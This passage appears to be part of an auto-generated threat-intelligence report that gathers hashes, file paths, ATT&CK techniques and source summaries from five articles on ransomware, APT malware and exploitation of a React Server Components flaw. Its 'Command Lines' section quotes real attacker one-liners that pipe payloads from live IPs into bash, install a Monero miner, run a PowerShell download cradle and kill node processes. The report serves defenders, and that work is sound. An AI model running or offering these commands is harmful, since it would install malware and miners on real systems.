- 🟢 `ebdb85704b2e7ced3673b12c6f3687bc0177a7b1b3caef110213cc93a75da837` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `ebe3b6977f66be30a22c2aff9b50fec8529dfa46415ea489bd7961552868f6b5` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `f380bd95156fbfb93537f35941278778819df1629cb4c5a4e09fe17f6293b7b7` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `f554c43707f5d87625a3834116a2d22f551b1d9a5aff1e446d24893975c431bc` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `f88ce150345787dd1bcfbc301350033404e32273c9a140f22da80810e3a3f6ea` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `f9816bc81de2e8639482c877a8defcaed9b15ffdce12beaef1cff3fea95999d4` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `fc9e53675e315edeea2292069c3fbc91337c972c936ca0f535da01760814b125` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

**MD5:**
- 🟢 `36f121046192b7cac3e4bec491e8f1b5` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🟢 `abe44ad128f765c14d895ee1c8bad777` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🟢 `fe091e41ba6450bcf6a61a2023fe6c83` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)

### Windows Paths

- 🟢 `C:\ProgramData\MicrosoftOneDrive.tlb` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🟢 `C:\Users\Public` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `C:\Windows\System32\Tasks\Automatic` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

### Command Lines

🟢 Command:
```
") || (command -v python >/dev/null 2>&1 && python -c "
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
(command -v curl >/dev/null 2>&1 && curl -s http://47.84.57.207/index | bash) || (command -v wget >/dev/null 2>&1 && wget -q -O- http://47.84.57.207/index | bash) || (command -v python3 >/dev/null 2>&1 && python3 -c "import urllib.request as u,subprocess;
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh -o ./s.sh 2>/dev/null || wget -qO ./s.sh http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh 2>/dev/null || python3 -c "import urllib.request as u;open('./s.sh','wb').write(u.urlopen('http://193.24.123.68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg.sh').read())") && [ -s ./s.sh ] && chmod +x ./s.sh && ./s.sh && break; sleep 300; done
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//46.36.37.85:12000/sex.sh && bash sex.sh
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//help.093214.xyz:9731/fn32.sh | bash | gzip -n | base64 -w0),/bin/sh -c echo VULN_CHECK_SUCCESS
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//keep.camdvr.org:8000/d5.sh | bash | gzip -n | base64 -w0),/bin/sh -c echo $((41*271)),/bin/sh -c echo $((42259*42449)),/bin/sh -c wget http://superminecraft.net.br:3000/sex.sh && bash sex.sh,/bin/sh -c wget https://sup001.oss-cn-hongkong.aliyuncs.com/123/python1.sh && chmod 777 python1.sh && ./python1.sh
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
//raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/rjs/filemanager-standalone.js 2>&1 && wc -c fm.js,/bin/sh -c echo $((41*271)),/bin/sh -c echo 'segawon.id' > /app/public/segawon.txt && chmod 644 /app/public/segawon.txt,/bin/sh -c echo 'segawon.id' > /app/web/public/segawon.txt && chmod 644 /app/web/public/segawon.txt,/bin/sh -c echo 'segawon.id' > /var/www/html/segawon.txt && chmod 644 /var/www/html/segawon.txt,/bin/sh -c id,/bin/sh -c killall -9 node 2>/dev/null,/bin/sh -c ls -la
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
/bin/sh -c (wget -qO- http://156.234.209.103:20912/get.sh || curl -fsSL http://156.234.209.103:20912/get.sh) | bash,/bin/sh -c curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner .sh | bash -s <encoded Monero address>,/bin/sh -c echo $((41*271)),/bin/sh -c echo $((42636*43926)),/bin/sh -c powershell -enc IEX (New-Object System.Net.Webclient).DownloadString('http://156.234.209.103:63938/nrCrQ')
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

🟢 Command:
```
/bin/sh -c echo wget -O /tmp/test.sh http://31.57.46.28/test.sh&&sh /tmp/test.sh|base64 -d|sh,/bin/sh -c id && pwd && ls -la && ps aux | grep node
```
Sources: [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

## 🎯 MITRE ATT&CK Techniques

| Technique | Sources |
|-----------|---------|
| T1053.005: Scheduled Task | [4](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/) |
| T1070: Indicator Removal | [5](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/) |
| T1073: DLL Side-Loading | [4](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/) |
| T1113: Screen Capture | [4](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/) |
| T1568: Dynamic Resolution | [2](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/) |
| T1574.002: DLL Side-Loading | [4](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/) |
| T1588.006: Vulnerabilities | [1](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/), [3](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/), [5](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/) |

## 📄 Source Details

> Expand each source for detailed information extracted from that article.

<details>
<summary><strong>Source 1: From Linear to Complex: An Upgrade in RansomHouse Encryption</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/

**IOCs from this source:** 5<br>
**MITRE techniques:** 1

**Excerpt:**
> Executive Summary RansomHouse is a ransomware-as-a-service (RaaS) operation run by a group that we track as Jolly Scorpius. Recent samples of the associated binaries used in RansomHouse operations reveal a significant upgrade in encryption. This article explores the upgrade of RansomHouse encryption and the potential impact for defenders. Jolly Scorpius uses a double extortion strategy. This strategy combines stealing and encrypting a victim's data with threats to leak the stolen data. The scale...

</details>

<details>
<summary><strong>Source 2: The HoneyMyte APT now protects malware with a kernel-mode rootkit</strong></summary>

**URL:** https://securelist.com/honeymyte-kernel-mode-rootkit/118590/

**IOCs from this source:** 11<br>
**MITRE techniques:** 1

**Excerpt:**
> Overview of the attacks In mid-2025, we identified a malicious driver file on computer systems in Asia. The driver file is signed with an old, stolen, or leaked digital certificate and registers as a mini-filter driver on infected machines. Its end-goal is to inject a backdoor Trojan into the system processes and provide protection for malicious files, user-mode processes, and registry keys. Our analysis indicates that the final payload injected by the driver is a new sample of the ToneShell bac...

</details>

<details>
<summary><strong>Source 3: Exploitation of Critical Vulnerability in React Server Components (Updated December 12)</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/

**IOCs from this source:** 138<br>
**MITRE techniques:** 1

**Excerpt:**
> Executive Summary Update Dec. 12, 2025 Unit 42 uncovered the previously unseen KSwapDoor. This Linux backdoor was initially mistaken for BPFDoor. Key features include: P2P mesh network: Enables multi-hop routing for robust C2 communications Strong encryption: Uses AES-256-CFB with Diffie-Hellman key exchange Stealth and persistence: Mimics a legitimate Linux kernel swap daemon Full remote access: Offers an interactive shell, command execution, file operations and lateral movement scanning Update...

</details>

<details>
<summary><strong>Source 4: Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/

**IOCs from this source:** 45<br>
**MITRE techniques:** 4

**Excerpt:**
> Executive Summary In recent months, we have been analyzing the activity of an advanced persistent threat (APT) known for its espionage activities against Arabic-speaking government entities. We track this Middle Eastern threat actor as Ashen Lepus (aka WIRTE ). We share details of a long-running, elusive espionage campaign targeting governmental and diplomatic entities throughout the Middle East. We discovered that the group has created new versions of their previously documented custom loader,...

</details>

<details>
<summary><strong>Source 5: 01flip: Multi-Platform Ransomware Written in Rust</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/

**IOCs from this source:** 7<br>
**MITRE techniques:** 2

**Excerpt:**
> Executive Summary In June 2025, we observed a new ransomware family named 01flip targeting a limited set of victims in the Asia-Pacific region. 01flip ransomware is fully written in the Rust programming language and supports multi-platform architectures by leveraging the cross-compilation feature of Rust. These financially motivated attackers likely carried this out through manual means. We have confirmed an alleged data leak from an affected organization on a dark web forum shortly after the at...

</details>

## 🔍 OCR Extracted Content

> Images extracted from source documents with OCR text. Click to expand each image.

<details>
<summary><strong>Image 1</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_001_8ec11303a508.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_8ec11303a508.png)

**Extracted Text:**
> %

</details>

<details>
<summary><strong>Image 4</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_031_2f7d32ab52f5.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_031_2f7d32ab52f5.png)

**Extracted Text:**
> ) , Y >»,

</details>

<details>
<summary><strong>Image 6</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_034_dca2be9dcf5e.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_034_dca2be9dcf5e.png)

**Extracted Text:**
> KC

</details>

<details>
<summary><strong>Image 11</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_043_1d5049a134ae.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_043_1d5049a134ae.jpg)

**Extracted Text:**
> Ru  o. OE)  /. 4

</details>

<details>
<summary><strong>Image 13</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_046_41f78ae601a6.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_046_41f78ae601a6.png)

**Extracted Text:**
> AN  ww

</details>

<details>
<summary><strong>Image 19</strong> from 118590</summary>

**View Image:** [url_img_028_23cc83dab4c3.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_028_23cc83dab4c3.png)

**Extracted Text:**
> Guangzhou Kingteller Technology Co.,Ltd. Identity: Guangzhou Kingteller Technology Co.,Ltd. Verified by: VeriSign Class 3 Code Signing 2010 CA Expires: 27/08/15  > Details  Subject Name  € (Country): nN  ST (State) ‘Guangdong  L (Locality): Guangzhou  ‘O(Organisation): Guangzhou Kingteller Technology Co.,Ltd.  OU (Organisation Unit): Digital ID Class 3 - Microsoft Software Validation v2 CN(CommonName): Guangzhou Kingteller Technology Co.,Ltd.  Issued Certificate Version: 3 Serial Number: @8 01 C...

</details>

<details>
<summary><strong>Image 20</strong> from 118590</summary>

**View Image:** [url_img_029_3ead8636c5e8.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_029_3ead8636c5e8.png)

**Extracted Text:**
> func hashString(str [Jbyte) uintes { var seed uint64 = 131313 // Seed values used in other modules: 1313131, 13131313 var hash uint64  for i i < Len(str); ist {  hash = hash*seed + uint64(str[i]) ? return hash

</details>

<details>
<summary><strong>Image 21</strong> from 118590</summary>

**View Image:** [url_img_030_a1ba8eec08fa.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_030_a1ba8eec08fa.png)

**Extracted Text:**
> 1 Find ahigh-prvilege process  Customizes the first payload with random  2 event names, temp file names, and padding bytes 3 Attach to the process and inject the payload  kemel-mode ‘malware  High-privilege Process  first payload  6  Create a svchost process  Inject a shellcode which creates delay in  the execution  Write process ID of the svchost process  ‘on the temp file  N  ‘Customizes the final payload with random event names, file names, and  padding bytes  Read the process ID of the svcho...

</details>

<details>
<summary><strong>Image 38</strong> from cve-2025-55182-react-and-cve-2025-66478-next</summary>

**View Image:** [url_img_001_8ec11303a508.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_8ec11303a508.png)

**Extracted Text:**
> %

</details>

<details>
<summary><strong>Image 50</strong> from hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag</summary>

**View Image:** [url_img_001_8ec11303a508.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_8ec11303a508.png)

**Extracted Text:**
> %

</details>

**OCR Summary:** 17 images processed with text extracted

---

*Generated by PEAK CTI v3.0 Multi-Source Consolidated Report*
*2026-01-01 02:21:51 UTC*